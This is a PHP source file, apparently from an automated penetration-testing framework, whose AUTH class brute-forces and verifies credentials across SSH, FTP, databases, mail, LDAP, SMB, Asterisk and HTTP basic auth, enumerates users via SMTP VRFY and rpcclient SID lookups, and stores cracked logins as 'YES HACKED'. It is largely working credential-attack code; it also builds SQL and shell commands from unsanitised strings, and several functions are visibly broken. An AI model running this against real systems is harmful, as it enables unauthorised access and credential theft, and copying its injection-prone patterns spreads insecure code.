<?php




class AUTH extends PORT{

    var $path_rpcclient ;
    var $path_hydra ;
    var $path_medusa ;
    var $path_ncrack ;
    var $path_smbclient ;
    
	public function __construct($stream,$eth,$domain,$ip,$port,$service_protocol) {
		// /usr/share/nmap/scripts/
        parent::__construct($stream,$eth,$domain,$ip,$port,$service_protocol);

	}
	
	public function auth2login4ncrack($results){
	    $result = "";
	    return $result;
	    $afficheUSER = array();
	    if (!empty($results)){
	        $results_dico  = explode("\n", $results);
	        foreach ($results_dico as $user){
	            
	            if (preg_match("/(?<login>[[:print:]]\w+):(?<pass>[[:print:]]\w+)([[:space:]]{1,})([[:print:]]{1,})([[:space:]]{1,})Valid credentials/", $user, $afficheUSER) ) {
	                if (isset($afficheUSER['login'])){ // faire pour plusieurs resultat
	                    $result .= $this->yesAUTH($this->port2id,$afficheUSER['login'], $afficheUSER['pass'],__FUNCTION__);
	                }
	            }
	        }
	    }
	    return $results.$result;
	}
	
	public function auth2login4nmap($results_xml,$fonction){
	    $user2info = $fonction ;
	    $user2name = "";
	    $user2pass = "";
	    $state = "";
	    $xml=simplexml_load_string($results_xml);
	    /*
	    //var_dump($xml);$this->pause();
	    var_dump($xml->host->ports->port->script->table) ;$this->pause();
	    echo $xml->host->ports->port->script->table->table->elem[0]['key'];$this->pause();
	    echo $xml->host->ports->port->script->table->table->elem[1]['key'];$this->pause();
	    echo $xml->host->ports->port->script->table->table->elem[2]['key'];$this->pause();
	     $this->pause();
	    */
	    if (isset($xml->host->ports->port->script->table->table)){
	        foreach ($xml->host->ports->port->script->table->children() as $elem){
	            if (isset($elem->elem[1])) { if($elem->elem[1]['key']=='username') $user2name = $elem->elem[1];}
	            if (isset($elem->elem[2])) { if($elem->elem[2]['key']=='password') $user2pass = $elem->elem[2];}
	            if (isset($elem->elem[0])) { if($elem->elem[0]['key']=='state') $state = $elem->elem[0];}
	            
	            if (!empty($user2name)){
	                $this->article("state", $state);
	                $this->article("USERNAME", $user2name);
	                $this->article("USERPASS", $user2pass);
	                $this->article("USERINFO", $user2info);
	                $this->yesAUTH($this->port2id, $user2name, $user2pass,$user2info);
	            }
	        }
	    }
    
	}
	
	public function auth2login4nmap8tmp($results,$fonction){
	    $result = "";
	    $afficheUSER = array();
	    if (!empty($results)){
	        $results_dico  = explode("\n", $results);
	        foreach ($results_dico as $user){
	            
	            if (preg_match("/(?<login>[[:print:]]\w+):(?<pass>[[:print:]]\w+)([[:space:]]{1,})([[:print:]]{1,})([[:space:]]{1,})Valid credentials/", $user, $afficheUSER) ) {
	                if (isset($afficheUSER['login'])){ // faire pour plusieurs resultat
	                    $result .= $this->yesAUTH($this->port2id,$afficheUSER['login'], $afficheUSER['pass'],__FUNCTION__);
	                }
	            }
	            
	            if (preg_match("/(?<login>[[:print:]]\w+):(?<pass>[[:print:]]\w+)([[:space:]]{1,})([[:print:]]{1,})([[:space:]]{1,})Login correct/", $user, $afficheUSER) ) {
	                if (isset($afficheUSER['login'])){ // faire pour plusieurs resultat
	                    $result .= $this->yesAUTH($this->port2id,$afficheUSER['login'], $afficheUSER['pass'],__FUNCTION__);
	                }
	            }
	            
	            if (preg_match("/(?<login>[[:print:]]\w+):(?<pass>[[:print:]]\w+) => Valid credentials/", $user, $afficheUSER) ) {
	                if (isset($afficheUSER['login'])){ // faire pour plusieurs resultat
	                    $result .= $this->yesAUTH($this->port2id,$afficheUSER['login'], $afficheUSER['pass'],__FUNCTION__);
	                }
	            }
	            
	            
	        }
	    }
	    return $results.$result;
	}
	
	
	
	
	
	public function yesAUTH($id8port,$user2name,$user2passe,$user2info) {
	    //$id8port = trim($id8port);$user2name = trim($user2name);$user2passe = trim($user2passe);$user2uid = trim($user2uid);$user2gid = trim($user2gid);$user2def = trim($user2def);$user2home = trim($user2home);$user2shell = trim($user2shell);$user2info = trim($user2info);
	    $chaine = "YES HACKED = $id8port:$user2name:$user2passe:$user2info";
	    $sql_r = "SELECT user2name,user2pass FROM AUTH WHERE id8port = $id8port AND user2name= '$user2name' AND user2pass= '$user2passe' ";
	    //echo "$sql_r\n";
	    if (!$this->checkBD($sql_r)) {
	        $this->log2succes($chaine);
	        $sql_w = "INSERT INTO AUTH (id8port,user2name,user2pass,user2info) VALUES ($id8port,'$user2name','$user2passe','$user2info');";
	        $this->mysql_ressource->query($sql_w);
	        echo "$sql_w\n";$this->pause();
	    }
	    $this->log2succes($chaine) ;
	}
	
	
	public function auth2login4hydra($results){
	    $afficheUSER = array();
	    if (!empty($results)){
	        $results_dico  = explode("\n", $results);
	        foreach ($results_dico as $user){
	            
	            if (preg_match("/login: (?<login>[[:print:]]\w+)([[:space:]]{1,})password: (?<pass>[[:print:]]\w+)$/", $user, $afficheUSER) ) {
	                //var_dump($afficheUSER);
	                if (isset($afficheUSER['login'])){ // faire pour plusieurs resultat
	                    $this->yesAUTH($this->port2id,$afficheUSER['login'], $afficheUSER['pass'],__FUNCTION__);

	                }
	            }
	            
	            // VNC
	            if (preg_match("/password: (?<pass>[[:print:]]\w+)$/", $user, $afficheUSER) ) {
	                //var_dump($afficheUSER);
	                if (isset($afficheUSER['login'])){ // faire pour plusieurs resultat
	                    $this->yesAUTH($this->port2id,"", $afficheUSER['pass'],__FUNCTION__);

	                }
	            }
	            
	            if (preg_match("/login: (?<login>[[:print:]]\w+)$/", $user, $afficheUSER) ) {
	                if (isset($afficheUSER['login'])){ // faire pour plusieurs resultat
	                    $this->yesAUTH($this->port2id,$afficheUSER['login'],__FUNCTION__);
	                }
	            }
	            
	        }
	    }
	    
        
	}
	

	
	public function auth2login4medusa($results){
	    $result = "$results";
	    if (!empty($results)){
	        $results_dico  = explode("\n", $results);
	        foreach ($results_dico as $user){
	            if (preg_match("/User: (?<login>[[:print:]]\w+)([[:space:]]{1,})Password: (?<pass>[[:print:]]\w+)([[:space:]]{1,})/", $user, $afficheUSER) ) {
	                if (isset($afficheUSER['login'])){ // faire pour plusieurs resultat
	                    $result .= $this->yesAUTH($this->port2id,$afficheUSER['login'], $afficheUSER['pass'], __FUNCTION__);
	                }
	            }

	            
	        }
	    }
	    return $result;
	}
	
	
	

	function auth2login_ssh($port,$user2name,$user2pass) {
	    $user2pass = trim($user2pass);
	    $user2name = trim($user2name);
	    $this->ssTitre(__FUNCTION__.": ssh '$user2name':'$user2pass'@$this->ip -p $port -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null -v");
	    if (!$connexion = @ssh2_connect($this->ip,$port)) return false ;
		return (@ssh2_auth_password($connexion, $user2name, $user2pass))?true:false;
	}
	
	function auth2login_ssh4dico($user2name) {
		$this->ssTitre(__FUNCTION__);
		$user2pass = $user2name;
		if ($this->auth2login_ssh($user2name, $user2pass)) $this->yesAUTH($this->port2id, $user2name, $user2pass,__FUNCTION__);
		$user2pass = "";
		if ($this->auth2login_ssh($user2name, $user2pass)) $this->yesAUTH($this->port2id, $user2name, $user2pass,__FUNCTION__);
		$user2pass = strrev($user2name);
		if ($this->auth2login_ssh($user2name, $user2pass)) $this->yesAUTH($this->port2id, $user2name, $user2pass,__FUNCTION__);
		$passwords = file("$this->dico_password.100");
		foreach ($passwords as $password){
		    $password = trim($password);
		    if ($this->auth2login_ssh($user2name, $password)) $this->yesAUTH($this->port2id, $user2name, $password,__FUNCTION__);
		}
	}
	
	
	
	function auth2login_ftp($port,$user2name,$user2pass) {
	    $user2pass = trim($user2pass);
	    $user2name = trim($user2name);
	    $this->ssTitre(__FUNCTION__.": ftp '$user2name':'$user2pass'@$this->ip -p $port ");
		$connexion = @ftp_connect($this->ip,$port) ;
		return (@ftp_login($connexion, $user2name, $user2pass))?true:false ;
	}
	
	
	function auth2login_ftp4exec($user2name,$user2pass,$command) {
	    $result = "";
	    $command = trim($command);
	    $user2pass = trim($user2pass);
	    $user2name = trim($user2name);
	    $this->ssTitre(__FUNCTION__.": ftp '$user2name':'$user2pass'@$this->ip -p $this->port '$command' ");
	    $connexion = @ftp_connect($this->ip,$this->port) ;
	    if(@ftp_login($connexion, $user2name, $user2pass)){
	    //$result .= ftp_pwd($connexion);
	    // get the file list for /

	    $result_cmd = $this->chaine(ftp_raw($connexion, $command));

	    $result .= "$result_cmd\n";
	    echo $result;
	    ftp_close($connexion);
	    }
	    
	    return $result;
	}
	
	
	
	function auth2login_mysql($port,$user2name,$user2pass) {
	    $user2pass = trim($user2pass);
	    $user2name = trim($user2name);
	    $this->ssTitre(__FUNCTION__.": mysql --user='$user2name' --password='$user2pass' --host=$this->ip --port=$port ");
	    return (@mysqli_connect($this->ip,$user2name,$user2pass,"information_schema",$port))?true:false;
	}
	
	function auth2login_pgsql($port,$user2name,$user2pass) {
	    $user2pass = trim($user2pass);
	    $user2name = trim($user2name);
	    $this->ssTitre(__FUNCTION__.": psql -h $this->ip -p $port -U '$user2name' -W '$user2pass' test");
		$conn_string = "host=$this->ip port=$port user='$user2name' password='$user2pass'";
		return (@pg_connect($conn_string))?true:false;
	}
	

	
	function auth2login_db2($user2name,$user2pass) {
	    $user2pass = trim($user2pass);
	    $user2name = trim($user2name);
	    $this->ssTitre(__FUNCTION__.": db2 '$user2name':'$user2pass'@$this->ip -p $this->port ");
		$conn_string = "HOSTNAME=$this->ip;PORT=$this->port;PROTOCOL=TCPIP;UID=$user2name;PWD=$user2pass";
		return (@db2_connect($conn_string))?true:false;
	}
	
	function auth2login_nntp($user2name,$user2pass) {
	    $user2pass = trim($user2pass);
	    $user2name = trim($user2name);
	    $this->ssTitre(__FUNCTION__.": nntp '$user2name':'$user2pass'@$this->ip -p $this->port ");
		$mbox = imap_open("{".$this->ip.":$this->port/nntp}INBOX",$user2name,$user2pass);
		if ($mbox == false) {echo "connexion failed\n";return FALSE;}
		$folders = imap_listmailbox($mbox, "{".$this->ip.":$this->port}", "*");
		if ($folders == false) {echo "ListMail failed\n";return FALSE;}
		else 	{$this->tab($folders);return TRUE;}
	}
	
	function auth2login_imap($user2name,$user2pass) {
	    $user2pass = trim($user2pass);
	    $user2name = trim($user2name);
	    $this->ssTitre(__FUNCTION__.": imap '$user2name':'$user2pass'@$this->ip -p $this->port ");
		$mbox = imap_open("{".$this->ip.":$this->port}INBOX",$user2name,$user2pass);
		if ($mbox == false) {echo "connexion failed\n";return FALSE;}
		$folders = imap_listmailbox($mbox, "{".$this->ip.":$this->port}", "*");
		if ($folders == false) {echo "ListMail failed\n";return FALSE;}
		else 	{$this->tab($folders);return TRUE;}
	}
	
	function auth2login_pop3($user2name,$user2pass) {
	    $user2pass = trim($user2pass);
	    $user2name = trim($user2name);
	    $this->ssTitre(__FUNCTION__.": pop3 '$user2name':'$user2pass'@$this->ip -p $this->port ");
		$mbox = imap_open("{".$this->ip.":$this->port/pop3}INBOX",$user2name,$user2pass);
		if ($mbox == false) {echo "connexion failed\n";return FALSE;}
		$folders = imap_listmailbox($mbox, "{".$this->ip.":$this->port}", "*");
		if ($folders == false) {echo "ListMail failed\n";return FALSE;}
		else 	{$this->tab($folders);return TRUE;}
	}
	
	
	
	
	

	function auth2login_imapssl($user2name,$user2pass) {
		$user2pass = trim($user2pass);
		$user2name = trim($user2name);
		$this->ssTitre(__FUNCTION__.": imapssl '$user2name':'$user2pass'@$this->ip -p $this->port ");
		$mbox = imap_open("{".$this->ip.":993/imap/ssl}INBOX",$user2name,$user2pass);
		if ($mbox == false) {echo "connexion failed\n";return FALSE;}
		$folders = imap_listmailbox($mbox, "{".$this->ip.":143}", "*");
		if ($folders == false) {echo "ListMail failed\n";return FALSE;}
		else 	{$this->tab($folders);return TRUE;}
	}
	
	function auth2login_pop3ssl($user2name,$user2pass) {
		$user2pass = trim($user2pass);
		$user2name = trim($user2name);
		$this->ssTitre(__FUNCTION__.": pop3ssl '$user2name':'$user2pass'@$this->ip -p $this->port ");
		$mbox = imap_open("{".$this->ip.":995/pop3/ssl/novalidate-cert}INBOX",$user2name,$user2pass);
		if ($mbox == false) {echo "connexion failed\n";return FALSE;}
		$folders = imap_listmailbox($mbox, "{".$this->ip.":143}", "*");
		if ($folders == false) {echo "ListMail failed\n";return FALSE;}
		else 	{$this->tab($folders);return TRUE;}
	}
	
	

	
	function auth2login_ldap($user2name,$user2pass){
	    $user2pass = trim($user2pass);
	    $user2name = trim($user2name);
	    $this->ssTitre(__FUNCTION__.": ldap '$user2name':'$user2pass'@$this->ip -p $this->port ");
		return (@ldap_connect($this->ip,$this->port))?true:false;
		// http://www.linux-france.org/prj/edu/archinet/systeme/ch56s05.html
	}
	
	
	function auth2login_mongodb($user2name,$user2pass){
	    $user2pass = trim($user2pass);
	    $user2name = trim($user2name);
	    $this->ssTitre(__FUNCTION__.": mongodb '$user2name':'$user2pass'@$this->ip -p $this->port ");
	    //$m = new MongoClient("mongodb://${$user2name}:${$user2pass}@$this->ip");
	    //return ($m)?true:false;
	}
	
	
	

	
	
	
	public function auth2login_smtp($port,$method,$username) {  // 25
	    $this->ssTitre(__FUNCTION__);
		$username = trim($username);
		if (empty($username)) return false;
		$fp = @fsockopen ($this->ip, $port, $errno, $errstr, 30 );
		if (! $fp) {
			echo " Erreur : $errstr ($errno) ".__FUNCTION__."\n";
		} else {
			$en_tete = fgets ( $fp );
			$code = substr ( $en_tete, 0, 3 );
			$code = ( int ) $code;
			// echo "Connexion : $code ->";
			if ($code == 220) {
				$out = "$method $username\n";
				fwrite ( $fp, $out );
			}
			$en_tete = fgets ( $fp );
			$code = substr ( $en_tete, 0, 3 );
			$code = ( int ) $code;
			// echo "APRES vrfy $mail : $code \n";
			fclose ( $fp );
			if ($code == 251 || $code == 551 ) return true;
			else return false;
		}
	}






	public function auth2login_finger($user2name,$user2pass){
	    $user2pass = trim($user2pass);
	    $user2name = trim($user2name);
	    $this->ssTitre(__FUNCTION__.": finger '$user2name':'$user2pass'@$this->ip -p $this->port ");
		$this->note("finger $user2name@$this->ip ");
	}
	

	
	public function auth2login_http4basic($user2name,$user2pass,$uri_401){
	    $user2pass = trim($user2pass);
	    $user2name = trim($user2name);
	    $this->ssTitre(__FUNCTION__.": 401 '$user2name':'$user2pass'@$this->ip -p $this->port ");
		$check = "";
		$query = "hydra -s $this->port -l $user2name -p $user2pass -w 30 -t 1 -f $this->ip http-get $uri_401 -e nsr | grep -i  'login:' | grep 'password:' ";
		$check = $this->req_ret_str($query);
		if (empty($check)) return FALSE;
		else return TRUE;
	
	}
	public function auth2login_asterisk($user2name,$user2pass) {// 5038
	    $user2pass = trim($user2pass);
	    $user2name = trim($user2name);
	    $this->ssTitre(__FUNCTION__.": asterisk '$user2name':'$user2pass'@$this->ip -p $this->port ");
		$query = "echo 'action: login\r\nusername: $user2name\r\nsecret: $user2pass\r\n' | nc $this->ip $this->port -v -w3 -n  | grep 'Authentication accepted' ";//
		$result = $this->req_ret_str($query);
		if (!empty($result)) return TRUE;
		else return FALSE;
	}
	


	
	
	public function auth2login_smb($user2name,$user2pass) {
	    $user2pass = trim($user2pass);
	    $user2name = trim($user2name);
	    $this->ssTitre(__FUNCTION__.": smb '$user2name':'$user2pass'@$this->ip -p $this->port ");
		$this->cmd("Win","net use \\\\$this->ip\\C $user2pass /u:$user2name");
		$query = "smbclient -L $this->ip -U $user2name%$user2pass  2>/dev/null | grep 'NT_STATUS_LOGON_FAILURE' ";
		$check = $this->req_ret_str($query);
		if (!empty($check)) return FALSE;
		else return TRUE;
	}
	
	public function auth2login_sid($sid,$user2name,$user2pass){
	    $user2pass = trim($user2pass);
	    $user2name = trim($user2name);
	    $this->ssTitre(__FUNCTION__.": sid '$user2name':'$user2pass'@$this->ip -p $this->port ");
	    $result = "";
	    $this->article("SID", $sid);

	    for ($rid = 0;$rid<=55;$rid++) $result .= $this->req_ret_str("rpcclient -c 'lookupsids $sid-$rid' -U '$user2name'%'$user2pass'  '$this->ip' -p $this->port  2>/dev/null | grep -v \"NT_STATUS_ACCESS_DENIED\" | grep -v \"Error was NT_STATUS\" | grep -v \"Cannot connect to server\" | grep -v \"*unknown*\" |  sed \"s/(1)/(Local User)/g\" | sed \"s/(2)/(Domain Group)/g\" | sed \"s/(3)/(Domain User)/g\" | sed \"s/(4)/(Local Group)/g\" | grep '(Local User)' | cut -d'\' -f2 | cut -d'(' -f1 ")."\n";
	    for ($rid = 495;$rid<=555;$rid++) $result .= $this->req_ret_str("rpcclient -c 'lookupsids $sid-$rid' -U '$user2name'%'$user2pass'  '$this->ip' -p $this->port  2>/dev/null | grep -v \"NT_STATUS_ACCESS_DENIED\" | grep -v \"Error was NT_STATUS\" | grep -v \"Cannot connect to server\" | grep -v \"*unknown*\" |  sed \"s/(1)/(Local User)/g\" | sed \"s/(2)/(Domain Group)/g\" | sed \"s/(3)/(Domain User)/g\" | sed \"s/(4)/(Local Group)/g\" | grep '(Local User)' | cut -d'\' -f2 | cut -d'(' -f1 ")."\n";
	    for ($rid = 995;$rid<=1055;$rid++) $result .= $this->req_ret_str("rpcclient -c 'lookupsids $sid-$rid' -U '$user2name'%'$user2pass'  '$this->ip' -p $this->port  2>/dev/null | grep -v \"NT_STATUS_ACCESS_DENIED\" | grep -v \"Error was NT_STATUS\" | grep -v \"Cannot connect to server\" | grep -v \"*unknown*\" |  sed \"s/(1)/(Local User)/g\" | sed \"s/(2)/(Domain Group)/g\" | sed \"s/(3)/(Domain User)/g\" | sed \"s/(4)/(Local Group)/g\" | grep '(Local User)' | cut -d'\' -f2 | cut -d'(' -f1 ")."\n";
	    
	    
	    $result = trim($result);
	         return $result;                  
	}
	

	
	
	
	
	
	
	
	
	
	
	
	
	
	
}
?>